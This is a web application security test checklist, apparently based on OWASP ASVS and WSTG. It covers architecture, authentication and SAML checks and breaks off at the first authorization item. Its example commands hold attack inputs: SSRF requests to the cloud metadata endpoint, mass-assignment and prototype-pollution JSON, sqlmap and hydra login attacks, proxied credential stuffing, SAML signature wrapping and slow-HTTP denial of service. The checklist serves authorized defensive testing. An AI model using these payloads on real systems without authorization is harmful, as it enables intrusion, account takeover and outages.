# WEB security test cases

501 tests. Tick the box when the test passes.


## ARCH

- [ ] **WEB-ARCH-001** Review the documented communication needs and external connections  
  *Severity if fail:* Low | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find undocumented external services and places where users can set an external location the server connects to.  
  *Steps:*
  1. Ask for the document of all communication needs, including external services.
  2. List the outbound hosts seen in traffic captures or egress logs.
  3. Find features where a user supplies a URL, host or webhook.
  4. Compare the list with the document.
  *Example:* `tcpdump -i any -nn 'dst net not 10.0.0.0/8' -w egress.pcap; review egress firewall logs`  
  *Expected:* All external services and user-supplied destinations are documented.  
  *Refs:* asvs: V13.1.1; wstg: WSTG-INFO-10; owasp_top10: A02:2025; cheatsheet: Attack_Surface_Analysis_Cheat_Sheet

- [ ] **WEB-ARCH-002** Review connection limits and resource management for each backend service  
  *Severity if fail:* Low | *Type:* Manual, Config Review | *Level:* ASVS L3  
  *Objective:* Find missing limits, time-outs and retry rules that cause denial of service when a backend is slow.  
  *Steps:*
  1. Ask for the documented connection pool limits, time-outs and retry rules per service.
  2. Read the configuration of each service client and compare it with the document.
  3. Slow down one backend in a test system and watch the application behavior.
  4. Fill the connection pool in a test system and check for graceful handling and recovery.
  *Example:* `toxiproxy-cli toxic add -t latency -a latency=10000 db; compare pool settings in app config`  
  *Expected:* Documented limits exist and match the configuration. The application degrades safely and recovers.  
  *Refs:* asvs: V13.1.2, V13.1.3, V13.2.6; owasp_top10: A10:2025; cwe: CWE-400, CWE-770

- [ ] **WEB-ARCH-003** Make sure backend components authenticate with individual, least-privilege accounts  
  *Severity if fail:* High | *Type:* Config Review, Manual | *Level:* ASVS L2  
  *Objective:* Find shared, uncontrolled or default service credentials, and over-privileged service accounts.  
  *Steps:*
  1. List service-to-service links: APIs, middleware, databases, queues.
  2. Check how each link authenticates: service account, short-term token, or certificate.
  3. Check that no link uses a shared static password or default credential such as root/root.
  4. Review the privileges of each account and compare them with what the link needs.
  *Example:* `psql -c '\du'; kubectl auth can-i --list --as=system:serviceaccount:ns:sa; try admin/admin on the management port`  
  *Expected:* Each link uses its own account or token with least privilege. No default credentials work.  
  *Refs:* asvs: V13.2.1, V13.2.2, V13.2.3; owasp_top10: A02:2025; cwe: CWE-1188, CWE-798, CWE-250; capec: CAPEC-112

- [ ] **WEB-ARCH-004** Make sure the server can contact only an allowlist of external systems  
  *Severity if fail:* High | *Type:* Manual, Config Review | *Level:* ASVS L2  
  *Objective:* Find servers that can send requests to any destination and so allow SSRF and data theft.  
  *Steps:*
  1. Find the egress allowlist at the application, web server or firewall level.
  2. Use a feature that fetches a URL and give it an internal address and a non-listed host.
  3. Try a redirect from an allowed host to a blocked host.
  4. From the server shell, in a test system, try to reach a non-listed external host.
  *Example:* `curl -s 'https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/'; curl -s 'https://example.com/fetch?url=https://allowed.example/redirect?to=http://127.0.0.1'`  
  *Expected:* The server reaches only allowlisted systems. Requests to others fail.  
  *Refs:* asvs: V13.2.4, V13.2.5, V15.3.2; owasp_top10: A02:2025; cwe: CWE-918, CWE-601; capec: CAPEC-212

- [ ] **WEB-ARCH-005** Make sure responses return only the fields that the client needs  
  *Severity if fail:* Medium | *Type:* Manual, Code Review | *Level:* ASVS L1  
  *Objective:* Find objects that expose internal or sensitive fields that the client does not need.  
  *Steps:*
  1. Compare the fields shown in the UI with the fields in the API or page response.
  2. Look for password hashes, tokens, internal IDs, role flags and personal data.
  3. Compare responses for different roles and for unauthenticated requests.
  4. Check nested objects and GraphQL fields.
  5. Look in the code for DTOs or field selection on the server.
  *Example:* `jq 'keys' response.json; Burp Logger++ filter on JSON; compare with UI`  
  *Expected:* Responses contain only the fields required by the function. The server selects fields, not the client.  
  *Refs:* asvs: V15.3.1; wstg: WSTG-APIT-03; cwe: CWE-213, CWE-200

- [ ] **WEB-ARCH-006** Test for mass assignment on create and update actions  
  *Severity if fail:* High | *Type:* Manual, Code Review | *Level:* ASVS L2  
  *Objective:* Find actions that bind extra request fields to protected object properties such as role or owner.  
  *Steps:*
  1. Find create and update requests that send a JSON, XML or form body.
  2. Add extra fields such as role, isAdmin, balance, ownerId and id.
  3. Send the request and read the object back.
  4. Check the code for an allowlist of fields or a DTO per action.
  *Example:* `curl -s -X PATCH https://example.com/api/me -H 'Content-Type: application/json' -d '{"name":"x","role":"admin","isAdmin":true}'`  
  *Expected:* Fields that are not part of the action are ignored or rejected. Protected properties do not change.  
  *Refs:* asvs: V15.3.3; wstg: WSTG-APIT-03; owasp_top10: A08:2025; cheatsheet: Mass_Assignment_Cheat_Sheet; cwe: CWE-915, CWE-235; capec: CAPEC-153

- [ ] **WEB-ARCH-007** Check strict typing and strict comparison to stop type confusion  
  *Severity if fail:* Medium | *Type:* Manual, Code Review | *Level:* ASVS L2  
  *Objective:* Find loose type handling that leads to type juggling and logic bypass.  
  *Steps:*
  1. Send arrays, objects, null, booleans and numeric strings where a string is expected.
  2. Send 0, "0", "0e123" and true in comparison fields such as tokens and passwords.
  3. Look in the code for loose comparison operators on security values.
  4. Check that input types are enforced before use.
  *Example:* `curl -s https://example.com/login -H 'Content-Type: application/json' -d '{"user":"admin","password":true}'; semgrep --config p/php`  
  *Expected:* The application rejects wrong types and uses strict comparison for security decisions.  
  *Refs:* asvs: V15.3.5; owasp_top10: A10:2025; cwe: CWE-754

- [ ] **WEB-ARCH-008** Test JavaScript code for prototype pollution  
  *Severity if fail:* High | *Type:* Manual, Code Review | *Level:* ASVS L2  
  *Objective:* Find merge and assignment code that lets a user set properties of Object.prototype.  
  *Steps:*
  1. Send JSON with __proto__, constructor and prototype keys to endpoints that merge input.
  2. Send the same in query strings and form fields.
  3. Check whether a later request shows a changed property.
  4. Search the code for recursive merge functions and object literals used as maps.
  *Example:* `curl -s -X POST https://example.com/api/settings -H 'Content-Type: application/json' -d '{"__proto__":{"polluted":"yes"}}'; ppfuzz or DOM Invader`  
  *Expected:* User input cannot change the prototype. The code uses Map or Set, or safe merge functions.  
  *Refs:* asvs: V15.3.6; cwe: CWE-1321

- [ ] **WEB-ARCH-009** Test for HTTP parameter pollution  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find parameters that the application, proxy and WAF read in different ways.  
  *Steps:*
  1. Send the same parameter twice in the query string, and in the body and the query together.
  2. Send the same name in a cookie and a header.
  3. Look at which value each component uses and compare the results.
  4. Check that the framework takes one defined source.
  *Example:* `curl -s 'https://example.com/transfer?to=alice&to=mallory'; curl -s -d 'amount=1&amount=1000' https://example.com/pay`  
  *Expected:* The application handles duplicate parameters in a defined way, and a WAF or proxy sees the same value.  
  *Refs:* asvs: V15.3.7; cwe: CWE-235; capec: CAPEC-153

- [ ] **WEB-ARCH-010** Review documented resource-demanding functions and the defenses against overload  
  *Severity if fail:* Medium | *Type:* Manual, Automated | *Level:* ASVS L2  
  *Objective:* Find expensive functions with no limits that an attacker can use to take the service down.  
  *Steps:*
  1. Ask for the list of functions that need much time or memory, for example search, export, upload and report.
  2. Check the documented defenses: rate limits, quotas, queues, timeouts and caching.
  3. Send a few requests at a normal rate and increase the load slowly on a test system.
  4. Test large uploads, large request bodies and slow connections.
  5. Check that the response time stays below the time-out of the client.
  *Example:* `slowhttptest -c 1000 -H -u https://example.com/; k6 run load.js; curl --limit-rate 10 -T bigfile https://example.com/upload`  
  *Expected:* Resource-demanding functions are documented and protected by limits. The service stays available under load.  
  *Refs:* asvs: V15.1.3, V15.2.2; owasp_top10: A10:2025; cheatsheet: Denial_of_Service_Cheat_Sheet; cwe: CWE-400, CWE-770, CWE-799; capec: CAPEC-125, CAPEC-130

- [ ] **WEB-ARCH-011** Review shared objects in multi-threaded code for thread safety  
  *Severity if fail:* Medium | *Type:* Code Review, Manual | *Level:* ASVS L3  
  *Objective:* Find race conditions on caches, files and in-memory objects that more than one thread uses.  
  *Steps:*
  1. Find shared mutable objects: caches, singletons, static fields and files.
  2. Check that thread-safe types or locks protect them.
  3. Send many parallel requests that change the same object.
  4. Run a race detector or thread sanitizer on the tests.
  *Example:* `go test -race ./...; java -XX:+UnlockDiagnosticVMOptions with thread-safety analyzers; Burp Turbo Intruder parallel requests`  
  *Expected:* Shared objects are accessed safely. Parallel requests do not corrupt data.  
  *Refs:* asvs: V15.4.1; cwe: CWE-362; capec: CAPEC-26

- [ ] **WEB-ARCH-012** Test for time-of-check to time-of-use gaps  
  *Severity if fail:* High | *Type:* Manual, Code Review | *Level:* ASVS L3  
  *Objective:* Find checks of state or permission that are not atomic with the action that follows.  
  *Steps:*
  1. Find checks of existence, permission or balance followed by an action.
  2. Send the same request many times in parallel, for example a coupon or a transfer.
  3. Look for results that break the check, such as a second use.
  4. Check that the check and action are one atomic operation, for example one database transaction or file operation.
  *Example:* `Burp Turbo Intruder single-packet attack; curl --parallel --parallel-max 30 -d 'code=SAVE10' https://example.com/redeem?[1-30]`  
  *Expected:* The check and the action are atomic. Parallel requests cannot break the check.  
  *Refs:* asvs: V15.4.2; cwe: CWE-367; capec: CAPEC-26

- [ ] **WEB-ARCH-013** Review lock use and fair resource allocation against deadlock and starvation  
  *Severity if fail:* Low | *Type:* Code Review | *Level:* ASVS L3  
  *Objective:* Find locks that cause deadlock and pools that starve low-priority work.  
  *Steps:*
  1. Review the code for lock order, retry loops and locks that outside code can change.
  2. Check that lock logic stays in the code that owns the resource.
  3. Check thread pool settings and queue priorities.
  4. Load the system with mixed work and look for tasks that never run.
  *Example:* `jstack <pid> | grep -A5 'deadlock'; py-spy dump --pid <pid>`  
  *Expected:* Locks are used in a consistent order and are not stuck. Low-priority work finishes in a reasonable time.  
  *Refs:* asvs: V15.4.3, V15.4.4; cwe: CWE-833, CWE-400


## AUTHN

- [ ] **WEB-AUTHN-001** Look for default and vendor accounts and passwords  
  *Severity if fail:* Critical | *Type:* Automated | *Level:* ASVS L1  
  *Objective:* Finds default administrator accounts and known vendor passwords that still work.  
  *Steps:*
  1. Identify the software and version from the response headers and login page.
  2. Find the vendor default accounts in the manual and in default-credential lists.
  3. Try each default pair on every login page, including admin consoles.
  4. Try admin, root, sa and system with blank, admin and password values.
  5. Make sure the build does not contain hard-coded or test accounts.
  *Example:* `nuclei -u https://target -tags default-login ; hydra -C default-creds.txt target https-post-form '/login:user=^USER^&pass=^PASS^:F=Invalid'`  
  *Expected:* No default, hard-coded or test account can log in. Default accounts are removed or disabled before production.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-ATHN-02; asvs: V6.3.2; cheatsheet: Authentication_Cheat_Sheet; cwe: CWE-1392, CWE-1393, CWE-798, CWE-259, CWE-258; capec: CAPEC-70

- [ ] **WEB-AUTHN-002** Check the account lockout and throttle on failed logins  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds missing or weak lockout that allows online password guessing.  
  *Steps:*
  1. Send three wrong passwords. Then send the correct password and note the result.
  2. Repeat with four and five wrong passwords and note when the account locks.
  3. Wait five, ten and fifteen minutes. Send the correct password after each wait.
  4. Look at the failed-login counter: make sure it follows the account and not only the IP address.
  5. If the lockout is client side, turn off JavaScript and send the requests with a proxy.
  6. Compare with the lockout rule in the security documentation.
  *Example:* `Burp Intruder, null payload x 10, resource pool: 1 concurrent request, delay 2000 ms, POST /login with the test user and a wrong password; then send the correct password.`  
  *Expected:* The application locks or delays the account after a small number of failures, as documented. The counter follows the account. A valid user is not locked out for long.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-ATHN-03; asvs: V6.3.1; cheatsheet: Authentication_Cheat_Sheet, Credential_Stuffing_Prevention_Cheat_Sheet; cwe: CWE-307, CWE-799, CWE-645; capec: CAPEC-112, CAPEC-49, CAPEC-16

- [ ] **WEB-AUTHN-003** Test distributed brute force, password spray and credential stuffing  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds protection that counts failures only per IP address and so misses spread-out attacks.  
  *Steps:*
  1. Prepare a list of known test user and password pairs and a list of common passwords.
  2. Send each pair from a different source IP address using proxies or VPN endpoints.
  3. Send one common password against many test accounts (password spray).
  4. Look for account lockout, CAPTCHA, delay or MFA step-up in the responses.
  5. Check if the application warns the user or the administrator about the attack.
  *Example:* `ffuf -w pairs.txt:USERPASS -X POST -d 'username=USERPASS&password=PASS' -u https://target/login -x socks5://127.0.0.1:9050 ; Burp Intruder cluster bomb for the spray case.`  
  *Expected:* The application detects attacks that span many IP addresses and accounts. It applies account-based controls such as step-up, delay or block, and it raises an alert.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-ATHN-03; asvs: V6.3.1; cheatsheet: Credential_Stuffing_Prevention_Cheat_Sheet, Authentication_Cheat_Sheet; cwe: CWE-307, CWE-521; capec: CAPEC-600, CAPEC-565

- [ ] **WEB-AUTHN-004** Try to bypass the CAPTCHA on login and recovery  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Finds CAPTCHA checks that the server does not enforce, so automated guessing still works.  
  *Steps:*
  1. Send the login request with the CAPTCHA parameter removed.
  2. Send the request with a wrong CAPTCHA value and with an empty value.
  3. Send the same solved CAPTCHA response in two requests.
  4. Clear the cookies and see if the CAPTCHA is skipped.
  5. Look in the alt text, file name and hidden fields for the answer.
  6. Try the mobile or API endpoint for the same function.
  *Example:* `Burp Repeater: delete the 'g-recaptcha-response' parameter, then replay an old valid token; compare the status codes.`  
  *Expected:* The server checks every CAPTCHA response, accepts it once, and rejects missing or wrong values. All endpoints enforce it. The CAPTCHA does not replace the lockout.  
  *Refs:* wstg: WSTG-ATHN-03; cheatsheet: Authentication_Cheat_Sheet, Credential_Stuffing_Prevention_Cheat_Sheet; cwe: CWE-307

- [ ] **WEB-AUTHN-005** Check that the account unlock process is not weak  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Finds unlock links or answers that an attacker can guess or reuse to unlock an account.  
  *Steps:*
  1. Lock a test account. Start the unlock process.
  2. Examine the unlock link or code: length, randomness and lifetime.
  3. Use the unlock link twice.
  4. Try to unlock another account by changing the user parameter.
  5. Make sure the unlock process has its own rate limit.
  *Example:* `Burp Repeater: GET /unlock?user=victim&token=<token>, replay twice, then change user=other.`  
  *Expected:* The unlock token is random, single use and short lived. An attacker cannot unlock an account that is not theirs. The process is rate limited.  
  *Refs:* wstg: WSTG-ATHN-03; cheatsheet: Forgot_Password_Cheat_Sheet, Authentication_Cheat_Sheet; cwe: CWE-640, CWE-645, CWE-330

- [ ] **WEB-AUTHN-006** Read the documentation for anti-automation controls  
  *Severity if fail:* Low | *Type:* Config Review | *Level:* ASVS L1  
  *Objective:* Finds missing or incomplete documentation of rate limit, anti-automation and adaptive controls.  
  *Steps:*
  1. Get the security documentation for authentication.
  2. Find the rules for rate limit, lockout and adaptive response against credential stuffing and brute force.
  3. Make sure the document gives the thresholds and configuration values.
  4. Make sure the document explains how malicious account lockout is prevented.
  5. Compare the documented values with the real configuration.
  *Example:* `Review the security design document and the gateway or WAF rate-limit configuration; record the threshold, window and lockout time.`  
  *Expected:* The documentation defines the controls, their values, and how they prevent malicious lockout. The real configuration matches it.  
  *Refs:* owasp_top10: A07:2025; asvs: V6.1.1; cheatsheet: Credential_Stuffing_Prevention_Cheat_Sheet; cwe: CWE-307

- [ ] **WEB-AUTHN-007** Read the documentation of all authentication pathways  
  *Severity if fail:* Low | *Type:* Config Review | *Level:* ASVS L2  
  *Objective:* Finds authentication pathways that are not documented with their required strength.  
  *Steps:*
  1. List every way to log in: web form, API, mobile, SSO, support channels and admin consoles.
  2. Get the documentation for authentication.
  3. Make sure each pathway is in the document with its controls and strength.
  4. Make sure the document says the controls must be the same on all pathways.
  *Example:* `Build a table: pathway, factors, rate limit, MFA, session type. Compare to the design document.`  
  *Expected:* All authentication pathways are documented together with the controls and strength that every pathway must enforce.  
  *Refs:* asvs: V6.1.3; cheatsheet: Authentication_Cheat_Sheet; cwe: CWE-288

- [ ] **WEB-AUTHN-008** Look for undocumented or weaker authentication pathways  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds alternative channels or endpoints with weaker authentication than the main login.  
  *Steps:*
  1. Find other channels: mobile site, old API versions, staging hosts, partner sites and call centre.
  2. Read robots.txt, sitemap.xml and the help pages for links to them.
  3. Try the same account on each channel.
  4. Compare lockout, MFA, password reset and TLS on each channel with the main login.
  5. Send the same login to each API version and look for missing checks.
  *Example:* `ffuf -w hosts.txt -u https://FUZZ.target/login ; curl -i https://m.target/myaccount/ ; curl -i https://target/api/v1/login vs /api/v2/login`  
  *Expected:* Every channel and API version enforces the same authentication strength. No undocumented pathway exists.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-ATHN-10; asvs: V6.3.4; cheatsheet: Authentication_Cheat_Sheet; cwe: CWE-288, CWE-424, CWE-306; capec: CAPEC-115

- [ ] **WEB-AUTHN-009** Try to bypass the authentication schema  
  *Severity if fail:* Critical | *Type:* Manual  
  *Objective:* Finds protected pages that can be reached by parameter changes, forced browsing or injection in the login.  
  *Steps:*
  1. Request each protected page without a session.
  2. Change values such as authenticated=no to authenticated=yes in URLs, cookies and hidden fields.
  3. Skip the second step of a multi-step login and request the final page.
  4. Try SQL injection payloads in the user and password fields.
  5. Look at the session ID values for predictable patterns.
  *Example:* `curl -i 'https://target/page.asp?authenticated=yes' ; sqlmap -u https://target/login --data 'user=a&pass=b' --level 3 --batch`  
  *Expected:* Protected pages need a valid server-side session. Client-side values do not change the result. Login input is not injectable.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-ATHN-04; cheatsheet: Authentication_Cheat_Sheet; cwe: CWE-287, CWE-288, CWE-302, CWE-306, CWE-603; capec: CAPEC-115

- [ ] **WEB-AUTHN-010** Check password comparison for type and length flaws  
  *Severity if fail:* High | *Type:* Code Review  
  *Objective:* Finds loose hash comparison, magic hashes and logins that accept a wrong password of the right length.  
  *Steps:*
  1. Log in with a wrong password that has the same length as the real one.
  2. Set a password whose hash starts with 0e and digits. Log in with a different 0e hash password.
  3. In PHP code, look for == in hash and token checks.
  4. Send a wrong-type value, such as true or an array, in place of the password or token.
  *Example:* `Test hashes: md5('240610708') and md5('QLTHNDT') both start with 0e; try each as the password for an account that holds the other. grep -rn '== md5\|== sha1' src/`  
  *Expected:* The application accepts only the exact password. It uses strict, constant-time comparison with fixed types.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-ATHN-04; cheatsheet: Authentication_Cheat_Sheet; cwe: CWE-303, CWE-1287, CWE-208

- [ ] **WEB-AUTHN-011** Check the remember me function and stored credentials  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Finds remember me tokens or stored credentials that stay valid too long or can be read.  
  *Steps:*
  1. Log in with remember me turned on.
  2. Look in cookies, localStorage and sessionStorage for passwords or encoded credentials.
  3. Decode every stored value and look for user names or passwords.
  4. Make sure the token expires and the server can revoke it.
  5. Check that login forms can not be framed or auto-submitted from another site.
  *Example:* `Browser DevTools > Application tab; echo '<value>' | base64 -d ; curl -I https://target/login | grep -i x-frame-options`  
  *Expected:* The browser holds no password or reversible credential. The remember me token is random, expires, and the server can revoke it.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-ATHN-05; cheatsheet: Session_Management_Cheat_Sheet, Authentication_Cheat_Sheet; cwe: CWE-522, CWE-312, CWE-922

- [ ] **WEB-AUTHN-012** Check that the browser cache does not keep private pages  
  *Severity if fail:* Low | *Type:* Manual  
  *Objective:* Finds sensitive pages that the browser stores or shows again after logout.  
  *Steps:*
  1. Log in and open pages with sensitive data.
  2. Log out and press the Back button.
  3. Look at the Cache-Control header on every authenticated response.
  4. Search the browser cache directory for sensitive values.
  5. Repeat with a mobile User-Agent.
  *Example:* `curl -sI -b 'session=<id>' https://target/account | grep -i cache-control ; ZAP passive scan rule 'Re-examine Cache-control Directives'`  
  *Expected:* Authenticated responses with sensitive data have Cache-Control: no-store. The Back button after logout does not show private data.  
  *Refs:* wstg: WSTG-ATHN-06; cheatsheet: Session_Management_Cheat_Sheet; cwe: CWE-525, CWE-524; capec: CAPEC-204

- [ ] **WEB-AUTHN-013** Check that users get notice of suspicious sign-in events  
  *Severity if fail:* Low | *Type:* Manual | *Level:* ASVS L3  
  *Objective:* Finds missing alerts for unusual or partly successful sign-in events.  
  *Steps:*
  1. Sign in from a new device and a new location.
  2. Fail the second factor with the correct password.
  3. Sign in successfully after several failures.
  4. Look at the notices: message, email and recent-login page.
  *Example:* `Log in with curl using a different User-Agent and X-Forwarded-For through a VPN; then read the mailbox of the test user.`  
  *Expected:* The user gets a notice for each suspicious event with time, device and place. The notice does not leak data of other users.  
  *Refs:* owasp_top10: A07:2025; asvs: V6.3.5; cheatsheet: Credential_Stuffing_Prevention_Cheat_Sheet, Multifactor_Authentication_Cheat_Sheet; cwe: CWE-778

- [ ] **WEB-AUTHN-014** Check that email is not an authentication factor  
  *Severity if fail:* Low | *Type:* Config Review | *Level:* ASVS L3  
  *Objective:* Finds designs that use email as a sole or additional factor for high assurance.  
  *Steps:*
  1. Read the authentication design and the login flow.
  2. Find any step that uses an emailed code or link as a factor.
  3. Make sure email is not used as a single factor or as a second factor.
  *Example:* `Log in with a test user and record each prompt in Burp; mark any step that sends a code to an email address.`  
  *Expected:* Email is not used as a single or second authentication factor at the L3 level. Stronger factors are used.  
  *Refs:* wstg: WSTG-ATHN-11; asvs: V6.3.6; cheatsheet: Multifactor_Authentication_Cheat_Sheet; cwe: CWE-308, CWE-309

- [ ] **WEB-AUTHN-015** Check notices after changes to authentication details  
  *Severity if fail:* Low | *Type:* Manual | *Level:* ASVS L3  
  *Objective:* Finds missing notices after password reset or email and user name change.  
  *Steps:*
  1. Reset the password of a test user.
  2. Change the email address and the user name.
  3. Read the messages that the old and the new address receive.
  4. Make sure the messages do not contain the password or a secret.
  *Example:* `Use a mail catcher such as MailHog: POST /account/email new=a@b.test, then list the messages for the old address.`  
  *Expected:* The user gets a notice after each change to authentication details. The notice goes to the old address as well. It contains no secrets.  
  *Refs:* asvs: V6.3.7; cheatsheet: Authentication_Cheat_Sheet, Forgot_Password_Cheat_Sheet; cwe: CWE-778, CWE-620

- [ ] **WEB-AUTHN-016** Check that one IdP cannot spoof a user of another IdP  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds account linking by email or user ID alone, which lets a second IdP take over an account.  
  *Steps:*
  1. List the IdPs that the application supports.
  2. Create an account at one IdP with the same email and user ID as a victim of another IdP.
  3. Log in to the application through that IdP.
  4. Examine if the application links the session to the victim account.
  5. Read the code for the account key: it must be IdP ID plus user ID.
  *Example:* `Register user victim@corp.test at a test IdP; log in with 'Login with IdP-B' and compare the resulting account ID.`  
  *Expected:* The application identifies users by IdP ID plus the IdP user ID. It does not link accounts by email or name alone.  
  *Refs:* asvs: V6.8.1; cheatsheet: Authentication_Cheat_Sheet; cwe: CWE-290, CWE-287

- [ ] **WEB-AUTHN-017** Check that SAML and JWT assertion signatures are required  
  *Severity if fail:* Critical | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds assertions that the application accepts without a valid signature.  
  *Steps:*
  1. Decode the SAMLResponse or the ID token and note the signed parts.
  2. Remove the signature and send the message.
  3. Change the NameID or a claim and keep the old signature.
  4. Sign the message with a different key.
  5. Move the signature between Response and Assertion.
  *Example:* `Burp SAML Raider: remove signatures, modify NameID, re-sign with a cloned self-signed certificate, then forward the SAMLResponse to /saml/acs.`  
  *Expected:* The application rejects unsigned assertions and any assertion with a bad signature. It uses only the signed data.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-ATHN-12; asvs: V6.8.2; cheatsheet: SAML_Security_Cheat_Sheet; cwe: CWE-347, CWE-345, CWE-303

- [ ] **WEB-AUTHN-018** Check that SAML assertions cannot be replayed  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds assertions that the service provider accepts more than once.  
  *Steps:*
  1. Log in through SAML and capture the SAMLResponse.
  2. Log out. Send the same SAMLResponse again.
  3. Send it twice inside the validity time.
  4. Check the Conditions: NotOnOrAfter and OneTimeUse.
  *Example:* `curl -i -X POST https://target/saml/acs --data-urlencode 'SAMLResponse=<captured>' -d 'RelayState=/' (send twice).`  
  *Expected:* The service provider accepts each assertion ID only once in its validity period and rejects repeats, also after logout.  
  *Refs:* wstg: WSTG-ATHN-12; asvs: V6.8.3; cheatsheet: SAML_Security_Cheat_Sheet; cwe: CWE-294; capec: CAPEC-60

- [ ] **WEB-AUTHN-019** Check that the application uses IdP authentication strength data  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds functions that need strong or recent login but do not check what the IdP reports.  
  *Steps:*
  1. Find functions that need MFA or a recent login.
  2. Log in with a weak method at the IdP.
  3. Call those functions and look at the response.
  4. Read the code for checks of the acr, amr and auth_time claims.
  *Example:* `jwt_tool <id_token> to read acr, amr, auth_time; then call the sensitive endpoint with a session from a password-only login.`  
  *Expected:* The application checks the strength, method and age of the login from the IdP data before it allows the function.  
  *Refs:* wstg: WSTG-ATHN-12; asvs: V6.8.4; cheatsheet: Authentication_Cheat_Sheet; cwe: CWE-308, CWE-304

- [ ] **WEB-AUTHN-020** Check SAML conditions: audience, recipient, issuer and time  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Finds service providers that do not enforce the Conditions and Subject data of an assertion.  
  *Steps:*
  1. Change the Audience to another service provider.
  2. Use the assertion before NotBefore and after NotOnOrAfter.
  3. Change the Recipient so it does not match the ACS URL.
  4. Send a response for an InResponseTo ID that this service did not issue.
  5. Send a response with a different Issuer.
  *Example:* `SAML Raider: edit Conditions/AudienceRestriction and SubjectConfirmationData/@Recipient, re-sign with the test IdP key, post to the ACS endpoint.`  
  *Expected:* The service provider rejects each changed or expired assertion. It checks Audience, Recipient, Issuer, validity and InResponseTo.  
  *Refs:* wstg: WSTG-ATHN-12; cheatsheet: SAML_Security_Cheat_Sheet; cwe: CWE-345, CWE-347, CWE-294

- [ ] **WEB-AUTHN-021** Test SAML signature wrapping and NameID parsing  
  *Severity if fail:* Critical | *Type:* Manual  
  *Objective:* Finds parser flaws that let an attacker place unsigned identity data next to a valid signature.  
  *Steps:*
  1. Copy the signed Assertion to a new place and add a changed assertion.
  2. Use a NameID such as user@example.com plus an XML comment and .attacker.com.
  3. Add a second Assertion for another user.
  4. Check if attributes can set roles or groups without a limit.
  5. Look for XSLT in the signature transforms.
  *Example:* `SAML Raider XSW 1-8 attacks; NameID test value: user@example.com<!---->.attacker.com`  
  *Expected:* The service provider reads identity only from the element whose signature it checked. Comments and extra assertions have no effect. Role attributes are limited.  
  *Refs:* wstg: WSTG-ATHN-12; cheatsheet: SAML_Security_Cheat_Sheet; cwe: CWE-347, CWE-345

- [ ] **WEB-AUTHN-022** Check SAML RelayState, IdP-initiated login and logout  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Finds open redirects, login CSRF and unsigned logout in SAML flows.  
  *Steps:*
  1. Change RelayState to an external URL and log in.
  2. Send an unsolicited response without an earlier request.
  3. Log out at the service provider. Look at the LogoutRequest signature.
  4. Use the old session cookie after logout.
  *Example:* `Burp Repeater: POST /saml/acs RelayState=https://evil.example/ ; replay the session cookie after SLO.`  
  *Expected:* RelayState allows only expected values. Unsolicited responses are accepted only if this is documented. Logout ends the session and uses signed messages.  
  *Refs:* wstg: WSTG-ATHN-12; cheatsheet: SAML_Security_Cheat_Sheet; cwe: CWE-601, CWE-352

- [ ] **WEB-AUTHN-023** Check protection of certificates used for authentication assertions  
  *Severity if fail:* High | *Type:* Config Review | *Level:* ASVS L3  
  *Objective:* Finds trusted certificates that an attacker can change.  
  *Steps:*
  1. Find where the service stores the IdP or device certificates.
  2. Look at the file and database permissions.
  3. Try to change a certificate with a low-privilege account.
  4. Check for integrity protection, such as a signed store or read-only mount.
  *Example:* `ls -l /etc/app/trust/ ; icacls C:\app\trust ; review the keystore ACL and backup access.`  
  *Expected:* Only privileged administrators can change trusted certificates. Changes are detected or logged.  
  *Refs:* asvs: V6.7.1; cheatsheet: SAML_Security_Cheat_Sheet; cwe: CWE-345

- [ ] **WEB-AUTHN-024** Check the challenge nonce of cryptographic authentication  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L3  
  *Objective:* Finds short or repeated challenge nonces in WebAuthn or certificate authentication.  
  *Steps:*
  1. Start 1000 login challenges and save each nonce.
  2. Look at the nonce length. It must be at least 64 bits.
  3. Look for repeated values.
  4. Make sure the server stores and checks the challenge for one login only.
  *Example:* `for i in $(seq 1000); do curl -s https://target/webauthn/challenge | jq -r .challenge; done | sort | uniq -d`  
  *Expected:* Each challenge is at least 64 bits long, unique, and valid for one login only.  
  *Refs:* asvs: V6.7.2; cheatsheet: Authentication_Cheat_Sheet; cwe: CWE-330, CWE-294

- [ ] **WEB-AUTHN-025** Check that authentication events are logged and alerted  
  *Severity if fail:* Low | *Type:* Config Review  
  *Objective:* Finds missing logs for failed logins and lockouts, which hides attacks.  
  *Steps:*
  1. Cause failed logins, a lockout and a password reset.
  2. Read the application and security logs.
  3. Make sure the log has time, source, account and result.
  4. Make sure passwords and tokens are not in the log.
  5. Check that repeated failures raise an alert.
  *Example:* `grep -iE 'login failed|locked' /var/log/app/auth.log | tail ; grep -i 'password=' /var/log/app/*.log`  
  *Expected:* All failed logins, lockouts and resets are logged and reviewed. Alerts exist for attack patterns. Logs hold no secrets.  
  *Refs:* owasp_top10: A07:2025; cheatsheet: Authentication_Cheat_Sheet, Credential_Stuffing_Prevention_Cheat_Sheet; cwe: CWE-778


## AUTHZ

- [ ] **WEB-AUTHZ-001** Read the authorization rules for functions and data  
  *Severity if fail:* Low | *Type:* Config Review | *Level:* ASVS L1  
  *Objective:* Finds missing rules for who may use which function and which data.  
